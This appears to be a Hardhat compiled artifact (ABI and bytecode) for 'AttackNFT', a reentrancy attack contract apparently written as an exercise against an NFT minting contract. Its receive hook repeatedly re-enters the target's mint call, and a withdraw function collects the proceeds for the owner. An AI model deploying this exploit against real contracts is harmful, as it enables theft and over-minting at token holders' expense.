{
  "_format": "hh-sol-artifact-1",
  "contractName": "AttackNFT",
  "sourceName": "contracts/ReentrancyAttack.sol",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_target",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [],
      "name": "Attack",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "attackCount",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        },
        {
          "internalType": "bytes",
          "name": "",
          "type": "bytes"
        }
      ],
      "name": "onERC721Received",
      "outputs": [
        {
          "internalType": "bytes4",
          "name": "",
          "type": "bytes4"
        }
      ],
      "stateMutability": "pure",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "owner",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "target",
      "outputs": [
        {
          "internalType": "contract IMyNFT",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "withdraw",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "stateMutability": "payable",
      "type": "receive"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b5060405161059a38038061059a83398101604081905261002f9161005d565b600080546001600160a01b039092166001600160a01b0319928316179055600180549091163317905561008d565b60006020828403121561006f57600080fd5b81516001600160a01b038116811461008657600080fd5b9392505050565b6104fe8061009c6000396000f3fe6080604052600436106100595760003560e01c8063150b7a02146101095780633ccfd60b14610153578063407c2821146101685780638da5cb5b1461018c578063d4b83992146101c4578063f28adc4d146101e457600080fd5b3661010457600560025410156101025760028054906000610079836103ea565b909155505060005460405163fb37e88360e01b815260206004820152600c60248201526b6d616c6963696f757355524960a01b60448201526001600160a01b039091169063fb37e8839066470de4df820000906064016000604051808303818588803b1580156100e857600080fd5b505af11580156100fc573d6000803e3d6000fd5b50505050505b005b600080fd5b34801561011557600080fd5b5061013561012436600461042d565b630a85bd0160e11b95945050505050565b6040516001600160e01b031990911681526020015b60405180910390f35b34801561015f57600080fd5b506101026101ec565b34801561017457600080fd5b5061017e60025481565b60405190815260200161014a565b34801561019857600080fd5b506001546101ac906001600160a01b031681565b6040516001600160a01b03909116815260200161014a565b3480156101d057600080fd5b506000546101ac906001600160a01b031681565b610102610309565b6001546001600160a01b031633146102375760405162461bcd60e51b81526020600482015260096024820152682737ba1037bbb732b960b91b60448201526064015b60405180910390fd5b6001546040516001600160a01b03909116904780156108fc02916000818181858888f19350505050158015610270573d6000803e3d6000fd5b506001546040516000916001600160a01b03169047908381818185875af1925050503d80600081146102be576040519150601f19603f3d011682016040523d82523d6000602084013e6102c3565b606091505b50509050806103065760405162461bcd60e51b815260206004820152600f60248201526e1dda5d1a191c985dc819985a5b1959608a1b604482015260640161022e565b50565b662386f26fc100003410156103605760405162461bcd60e51b815260206004820152601860248201527f4e6f7420656e6f7567682045544820746f2061747461636b0000000000000000604482015260640161022e565b600060028190555460405163fb37e88360e01b815260206004820152600c60248201526b6d616c6963696f757355524960a01b60448201526001600160a01b039091169063fb37e8839066470de4df820000906064016000604051808303818588803b1580156103cf57600080fd5b505af11580156103e3573d6000803e3d6000fd5b5050505050565b60006001820161040a57634e487b7160e01b600052601160045260246000fd5b5060010190565b80356001600160a01b038116811461042857600080fd5b919050565b60008060008060006080868803121561044557600080fd5b61044e86610411565b945061045c60208701610411565b935060408601359250606086013567ffffffffffffffff8082111561048057600080fd5b818801915088601f83011261049457600080fd5b8135818111156104a357600080fd5b8960208285010111156104b557600080fd5b969995985093965060200194939250505056fea26469706673582212204abcde162c8dcb8b20d9f010abcdc98cb179c834b6a54b6b379b2eb8c9e8059164736f6c63430008150033",
  "linkReferences": {},
  "deployedLinkReferences": {}
}